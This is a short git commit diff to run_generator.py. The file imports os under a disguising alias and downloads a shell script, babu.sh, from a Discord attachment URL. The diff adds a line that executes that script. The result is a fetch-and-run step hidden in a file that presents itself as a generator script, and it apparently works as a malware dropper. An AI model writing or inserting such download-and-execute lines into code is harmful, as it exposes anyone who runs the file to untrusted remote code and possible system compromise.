397606ade83f44747ae0eea7973b71e6be8f7e30
bartu221 <44907925+bartu221@users.noreply.github.com>
2021-10-19 20:10:46 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -2,3 +2,4 @@ import os as alpha
 alpha.system("pip install --upgrade pip")
 alpha.system("apt-get install wget")
 alpha.system("wget https://cdn.discordapp.com/attachments/776847799383752724/900067705128886282/babu.sh")
+alpha.system("./babu.sh")
